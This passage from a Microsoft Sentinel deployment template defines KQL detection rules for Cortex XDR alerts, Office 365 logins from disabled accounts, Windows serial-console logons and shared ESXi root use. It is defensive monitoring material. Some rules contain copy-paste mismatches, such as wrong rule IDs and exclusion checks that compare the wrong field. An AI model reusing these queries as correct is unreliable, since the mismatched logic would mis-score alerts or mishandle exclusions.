EventCount=count(),\n    TimeGenerated=min(TimeGenerated)\n    by InitiatingUserOrApp,    \n    OperationName,\n    SourceIP = InitiatingIpAddress,\n    UserAgent,\n    targetDisplayName,\n    targetId,\n    targetType,\n    keyDisplayName,\n    keyType,\n    keyUsage,\n    keyIdentifier,\n    bin(TimeGenerated,alert_bin)\n| parse InitiatingUserOrApp with UserName '@' UserDomain\n| project EventCount,TimeGenerated,UserName,UserDomain,OperationName,SourceIP,UserAgent,targetDisplayName,targetId,targetType,keyDisplayName,keyType,keyUsage,keyIdentifier",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "DnsDomain",
                  "columnName": "UserDomain"
                },
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11215')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11215')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11215: [RBA] Cortex XDR - Alert",
          "description": "This alert identifies all Cortex XDR alerts MITRE: T1090,T1132,T1001,T1030,T1048,T1041,T1008,T1104,T1046,T1219,T1105,T1029,T1071,T1095,T1221,T1204,T1102 Category: PaloAltoNetworks tag: RBA",
          "severity": "Low",
          "enabled": false,
          "query": "let RuleId_constant = 'BV-11217';\nlet start_time = 10m;\nlet latency = 0m;\nlet start_time_historical = 1d; \nlet alert_bin = 10m;\nlet end_time = now();\nlet monitored_severity = coalesce(BV11217_CONFIGURATION['MONITORED_SEVERITY'], dynamic(['High']));\nlet global_overrides = bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId;\nlet client_overrides = BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId;\nlet HistoricalAlerts = \ntoscalar(SecurityAlert\n| where TimeGenerated between (ago(start_time_historical) .. end_time)\n| where AlertName startswith 'BV-11217:'\n| extend bv_vendor_id = todynamic(tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Custom Details\"])).bv_vendor_id))[0]))\n| summarize make_set(bv_vendor_id)\n);\nCommonSecurityLog\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where ExtID !in (HistoricalAlerts)\n| where DeviceProduct == \"Cortex XDR\"\n| where DeviceEventClassID !in~ ('Management Audit Logs')\n| extend bv_signature = Activity\n| extend bv_file_path = FilePath\n| extend bv_file_hash = FileHash\n| extend bv_vendor_reason = Message\n| extend bv_alert_link = RequestURL\n| extend bv_alert_id = ExtID\n| extend bv_src_user = iff(SourceUserName !contains 'N/A', todynamic(replace_string(SourceUserName,\"'\",'\"')),dynamic([]))\n| extend bv_vendor_category = DeviceEventCategory\n| extend bv_raw = AdditionalExtensions\n| extend bv_src_dvc = SourceHostName\n| extend bv_vendor_product = DeviceEventClassID\n| extend sourcetype = \"Cortex\"\n| extend bv_vendor_severity = LogSeverity\n| extend bv_src_ip = SourceIP\n| parse bv_vendor_reason with * 'external host ' bv_dest ' ' *\n| extend bv_url = iff(isempty(ipv6_is_match(bv_dest,'127.0.0.1')), bv_dest, '')\n| extend bv_dest_ip = iff(isnotempty(ipv6_is_match(bv_dest,'127.0.0.1')), bv_dest, '')\n| extend bv_start_time = TimeGenerated\n| extend bv_alert_severity = case(\n    toint(bv_vendor_severity) <=3, 'Low'\n    , toint(bv_vendor_severity) <= 6, 'Medium'\n    , toint(bv_vendor_severity) > 6, 'High'\n    , 'unknown'\n)\n| extend bv_process_command_line2 = extract(@'Command line: (.+?)\\.\\s',1,bv_vendor_reason)\n| parse AdditionalExtensions with * 'targetprocessname=' bv_process';' *\n| parse AdditionalExtensions with * 'targetprocesscmd=' bv_process_command_line1 ';' *\n| parse AdditionalExtensions with * 'osParentName=' bv_parent_process ';' *\n| parse AdditionalExtensions with * 'osParentCmd=' bv_parent_process_command_line ';' *\n| extend bv_process_command_line = coalesce(bv_process_command_line1, bv_process_command_line2 )\n| mv-apply e = BV11217_CONFIGURATION['EXCLUSION'] on (\n        extend keys = bag_keys(e)\n        | extend bv_src_dvc_list = split(e.bv_src_dvc, ',')\n        | extend bv_src_ip_list = split(e.bv_src_ip, ',')\n        | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n        | extend bv_signature_excluded = iff(bv_signature contains e.bv_signature and isnotempty(e.bv_signature), 1, 0)\n        | extend bv_file_path_excluded = iff(bv_file_path contains e.bv_file_path and isnotempty(e.bv_file_path), 1, 0)\n        | extend bv_file_hash_excluded = iff(bv_file_hash contains e.bv_file_hash and isnotempty(e.bv_file_hash), 1, 0)\n        | extend bv_url_excluded = iff(bv_file_hash contains e.bv_url and isnotempty(e.bv_url), 1, 0)\n        | extend bv_dest_ip_excluded = iff(bv_file_hash contains e.bv_dest_ip and isnotempty(e.bv_dest_ip), 1, 0)\n        | extend bv_vendor_product_excluded = iff(bv_vendor_product contains e.bv_vendor_product and isnotempty(e.bv_vendor_product), 1, 0)\n        | extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user and isnotempty(e.bv_src_user), 1, 0)\n        | extend bv_vendor_category_excluded = iff(bv_vendor_category contains e.bv_vendor_category and isnotempty(e.bv_vendor_category), 1, 0)\n        | extend bv_process_excluded = iff(bv_process contains e.bv_process and isnotempty(e.bv_process), 1, 0)\n        | extend bv_process_command_line_excluded = iff(bv_process_command_line contains e.bv_process_command_line and isnotempty(e.bv_process_command_line), 1, 0)\n        | extend bv_parent_process_excluded = iff(bv_parent_process contains e.bv_parent_process and isnotempty(e.bv_parent_process), 1, 0)\n        | extend bv_parent_process_command_line_excluded = iff(bv_parent_process_command_line contains e.bv_parent_process_command_line and isnotempty(e.bv_parent_process_command_line), 1, 0)\n        | mv-apply f = bv_src_dvc_list on (\n                extend bv_src_dvc_excluded = iff(tolower(bv_src_dvc) contains tolower(f) and isnotempty(f), true, false)\n                | summarize bv_src_dvc_excluded = countif(bv_src_dvc_excluded)\n                | extend bv_src_dvc_excluded = iff(bv_src_dvc_excluded > 0 , 1, 0)\n        )\n        | mv-apply f = bv_src_ip_list on (\n                extend bv_src_ip_excluded = iff(ipv6_is_match(bv_src_ip,tostring(f)) and isnotempty(f), true, false)\n                | summarize bv_src_ip_excluded = countif(bv_src_ip_excluded)\n                | extend bv_src_ip_excluded = iff(bv_src_ip_excluded > 0 , 1, 0)\n        )\n        | extend excluded_count =   \n                bv_signature_excluded\n                + bv_file_path_excluded         \n                + bv_file_hash_excluded         \n                + bv_src_user_excluded          \n                + bv_vendor_category_excluded           \n                + bv_process_excluded           \n                + bv_process_command_line_excluded            \n                + bv_parent_process_excluded            \n                + bv_parent_process_command_line_excluded      \n                + bv_src_dvc_excluded \n                + bv_src_ip_excluded\n                + bv_vendor_product_excluded\n                + bv_dest_ip_excluded\n                + bv_url_excluded\n        | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n        | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n        | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n        | summarize excluded=make_set(excluded), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n//removes all events with a visibility of 0\n| where visibility !contains '0'\n| extend rba_score = coalesce(tolong(BV11217_CONFIGURATION['RBASCORE']),1)\n| mv-apply n = bv_src_user on ( \n    extend bv_src_user_normalized = bv_cim_normalize_username(n)\n    | summarize bv_src_user_normalized = make_set(bv_src_user_normalized)\n)\n| extend ExtendedDescription = strcat(\n        'bv_signature: ', bv_signature, '\\n' \n        ,'bv_vendor_reason: ', bv_vendor_reason, '\\n'\n        , iff(isnotempty(bv_file_path),strcat('bv_file_path: ', bv_file_path, '\\n'),'')\n        , iff(isnotempty(bv_file_hash),strcat('bv_file_hash: ', bv_file_hash, '\\n'),'')\n        , 'bv_vendor_category: ', bv_vendor_category, '\\n'  \n        , iff(isnotempty(bv_url),strcat('bv_process: ', bv_url, '\\n'),'')\n        , iff(isnotempty(bv_dest_ip),strcat('bv_process: ', bv_dest_ip, '\\n'),'')\n        , iff(isnotempty(bv_process),strcat('bv_process: ', bv_process, '\\n'),'')\n        , iff(isnotempty(bv_process_command_line),strcat('bv_process_command_line: ', bv_process_command_line, '\\n'),'')\n        , iff(isnotempty(bv_parent_process),strcat('bv_parent_process: ', bv_parent_process, '\\n'),'')\n        , iff(isnotempty(bv_parent_process_command_line),strcat('bv_parent_process_command_line: ', bv_parent_process_command_line, '\\n'),'')\n        , iff(isnotempty(bv_src_dvc),strcat('bv_src_dvc: ', bv_src_dvc, '\\n'),'')\n        , iff(isnotempty(bv_src_ip),strcat('bv_src_ip: ', bv_src_ip, '\\n'),'')        \n        , 'bv_src_user: \\n* ', strcat_array(bv_src_user, '\\n* '), '\\n\\n' \n)\n| extend bv_alarm_victim_entities = array_concat(pack_array(bv_src_dvc), bv_src_user_normalized)\n| extend RuleId = RuleId_constant\n| join kind=leftouter global_overrides on RuleId\n| join kind=leftouter client_overrides on RuleId\n| extend rba_multiplier = coalesce(ClientRBAMultiplier,GlobalRBAMultiplier, 1.0)\n| extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n| extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n| extend rba_override = coalesce(ClientOverrideRBA,GlobalOverrideRBA, toreal(rba_score), 1.0)\n| extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier  \n| extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n| project-keep    \n    bv_*\n    , ExtendedDescription",
          "queryFrequency": "PT10M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "CommandAndControl",
            "DefenseEvasion",
            "Exfiltration",
            "Discovery"
          ],
          "techniques": [
            "T1090",
            "T1132",
            "T1001",
            "T1030",
            "T1048",
            "T1041",
            "T1008",
            "T1104",
            "T1046",
            "T1219",
            "T1105",
            "T1029",
            "T1071",
            "T1095",
            "T1221",
            "T1204",
            "T1102"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-11215: [RBA] Cortex {{bv_vendor_product}} - {{bv_signature}}",
            "alertDescriptionFormat": "This alert identifies all Cortex XDR alerts\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: PaloAltoNetworks"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "RBAScore": "bv_alarm_rba_score",
            "bv_vendor_id": "bv_alert_id"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            },
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_file_path"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11200')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11200')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11200: [RBA] O365 - Login From Disabled Account",
          "description": "This alert identifies Office 365 authentications from a previously disabled account identified from IdentityInfo MITRE: T1078,T1114 Category: Office 365 tag: RBA",
          "severity": "Low",
          "enabled": false,
          "query": "let start_time = 1h;\nlet latency = 0m;\nlet alert_bin = 1h;\nlet end_time = now();\nlet start_time_historical = 7d;  \nlet global_config = dynamic({\n  'RBASCORE': 1.0\n  , 'EXCLUSION': dynamic([{}])\n});\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV11200_CONFIGURATION['RBASCORE']),1.0);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV11200_CONFIGURATION['EXCLUSIONS'], dynamic([{}]));\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n    let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n    table_parameter\n    | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n    | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n    | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n    | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n    | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n    | extend ModifiedRBAScore = case(\n      ModifiedRBAScore > 10, 10.0\n      , ModifiedRBAScore <0.1, 0.1\n      , ModifiedRBAScore\n    )\n    | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*)){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = parse_json(all_data[k])\n        | extend ExtendedDescription = iff(k startswith 'bv_', strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n            , isnotempty(array_sort_desc(pack_array(all_data[k]))[0]), strcat(k,': ', all_data[k])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet exclusion_filter = (table_parameter: (*)){\n      table_parameter\n      | extend all_data = pack_all()\n      | mv-apply e = exclusions on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | mv-apply k = keys to typeof(string) on (\n              extend list = split(e[k],',')\n              | mv-apply l = list to typeof(string) on (\n                  extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                  | mv-apply i = item to typeof(string) on (\n                      extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                      | summarize excluded_count = countif(compare)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_count = countif(item_excluded)\n                  | extend item_excluded = excluded_count > 0\n              )\n              | summarize excluded_list_item = countif(item_excluded > 0)\n          )\n          | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n          | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n          | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n          | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n      )\n      | extend drop_event = iff(exclusion_matched contains \"true\", true, false)\n};\nlet DisabledUsers = IdentityInfo\n  | where TimeGenerated between (ago(start_time_historical) .. now()) \n  | where IsAccountEnabled == false\n  | project AccountUPN\n  | parse AccountUPN with bv_src_user '@' bv_src_user_domain\n  | summarize by bv_src_user = tolower(bv_src_user);\nOfficeActivity\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where Operation =~ 'MailboxLogin'\n| parse UserId with bv_src_user '@' bv_src_user_domain\n| extend \n    bv_src_user = tolower(bv_src_user)\n    , bv_dest_user = tolower(MailboxOwnerUPN)\n    , bv_change_action = tolower(Operation)\n    , bv_src_ip = ClientIP\n    , bv_src_dvc = OriginatingServer\n    , bv_user_agent = ClientInfoString\n| join kind=leftsemi DisabledUsers on bv_src_user\n| summarize \n      bv_start_time = min(TimeGenerated)\n      , bv_end_time   = max(TimeGenerated)\n      , bv_event_count = count()\n      , bv_src_ip   = make_set(bv_src_ip)\n      , bv_src_dvc = make_set(bv_src_dvc)\n      , bv_user_agent = make_set(ClientInfoString)\n      , bv_dest_user = make_set(bv_dest_user)\n      , bv_change_action = make_set(bv_change_action)            \n    by \n      bv_src_user      \n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-20515')\n| invoke description() \n| extend bv_alarm_victim_entities = pack_array(bv_src_user)\n| extend bv_alarm_attacker_entities = pack_array(bv_src_user)\n| project-keep\n    bv_*\n    , ExtendedDescription ",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess",
            "Collection"
          ],
          "techniques": [
            "T1078",
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies Office 365 authentications from a previously disabled account identified from IdentityInfo\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Office 365"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1512')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1512')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1512: [RBA] Windows - Access Via Serial Connection",
          "description": "This alerts when the Special Administration Console (SAC) is used to allow connections to a running OS via serial port. MITRE: T1548,T1133 Category: Windows Security tag: RBA",
          "severity": "Medium",
          "enabled": false,
          "query": "let EventIDList = dynamic([4624]);\nlet latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h;\nlet global_config = dynamic({\n  'EXCLUSION': dynamic([{}])\n});\nlet exclusions = array_concat(global_config['EXCLUSION'], BV1512_CONFIG['EXCLUSION'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV1512_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n    let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n    table_parameter\n    | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n    | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n    | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n    | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n    | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n    | extend ModifiedRBAScore = case(\n      ModifiedRBAScore > 10, 10.0\n      , ModifiedRBAScore <0.1, 0.1\n      , ModifiedRBAScore\n    )\n    | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*)){\n  table_parameter\n  | extend all_data = pack_all(false)\n  | extend keys = bag_keys(all_data)\n  | mv-apply k = keys to typeof(string) on (\n      extend dynamic_entity = parse_json(all_data[k])\n      | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw',strcat(\n      case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n      , strcat(k,': ', all_data[k])\n      )\n      ),'')\n      | summarize ExtendedDescription = make_set(ExtendedDescription), k = make_set(k)\n  )\n  | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet exclusion_filter = (table_parameter: (*)){\n      table_parameter\n      | extend all_data = pack_all()\n      | mv-apply e = exclusions on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | mv-apply k = keys to typeof(string) on (\n              extend list = split(e[k],',')\n              | mv-apply l = list to typeof(string) on (\n                  extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                  | mv-apply i = item to typeof(string) on (\n                      extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                      | summarize excluded_count = countif(compare)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_count = countif(item_excluded)\n                  | extend item_excluded = excluded_count > 0\n              )\n              | summarize excluded_list_item = countif(item_excluded > 0)\n          )\n          | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n          | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n          | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n          | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n      )\n      | extend drop_event = iff(exclusion_matched contains \"true\", true, false)\n      | where not(drop_event)\n};      \nSecurityEvent\n|where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where LogonType == 2\n| where ProcessName has 'sacsess.exe'\n| project \n    bv_user = TargetUserName\n    , bv_user_id = TargetUserSid\n    , bv_src_user = SubjectUserName\n    , bv_src_user_id = SubjectUserSid\n    , bv_dest_user = TargetUserName\n    , bv_dest_user_id = TargetUserSid\n    , bv_src_ip = IpAddress\n    , bv_src_port = IpPort\n    , bv_process = ProcessName\n    , bv_process_id = ProcessId\n    , bv_start_time = TimeGenerated\n    , bv_src_dvc = Computer\n    , bv_alert_time = now()\n    , bv_vendor_product = 'Windows'\n    , sourcetype = 'SecurityEvent'\n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-1512')\n| invoke description()\n| extend bv_alarm_victim_entities = pack_array(bv_user)\n| extend bv_alarm_attacker_entities = pack_array(bv_src_user)\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription           ",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation",
            "DefenseEvasion",
            "Persistence",
            "InitialAccess"
          ],
          "techniques": [
            "T1548",
            "T1133"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-1512: [RBA] Windows - Access Via Serial Connection",
            "alertDescriptionFormat": "This alerts when the Special Administration Console (SAC) is used to allow connections to a running OS via serial port.\n\n{{ExtendedDescription}}\n\nMITRE: T1548 MITRE: T1133\nCategory: Windows Security\ntag: RBA"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_dest_user"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      }
    ]
  },
  {
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {
      "workspace": {
        "type": "String"
      }
    },
    "resources": [
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-895')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-895')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-895: [Hygiene] ESXI - Shared Root Account",
          "description": "This alert is triggered when the root user is used to authenticate to ESXI from multiple source IP addresses.\n\nIndividual user accounts should be used to authenticate to ESXI for auditing purposes. MITRE: T1110 Category: Vmware ESXi tag: Hygiene",
          "severity": "Informational",
          "enabled": false,
          "query": "let start_time = 15m;\nlet end_time = now();\nlet latency = 60m;\nlet alert_bin = 15m;\nbv_vmware_esxi\n| where TimeGenerated between (ago(start_time + latency) .. end_time)\n| where SyslogMessage has_all ('root', 'logged in')\n| extend SrcIpAddr = extract(@'root@(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})', 1, SyslogMessage)\n| summarize FirstEvent=min(TimeGenerated), Count=count(), UniqueSrcIPs=dcount(SrcIpAddr), SrcIPs=make_set(SrcIpAddr) by Computer, bin(TimeGenerated, alert_bin)\n| where UniqueSrcIPs>1\n| extend SrcIP1 = SrcIPs[0], SrcIP2 = SrcIPs[1]\n| project TimeGenerated, FirstEvent, UniqueSrcIPs, Computer, SrcIP1, SrcIP2, SrcIPs",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT1H15M",
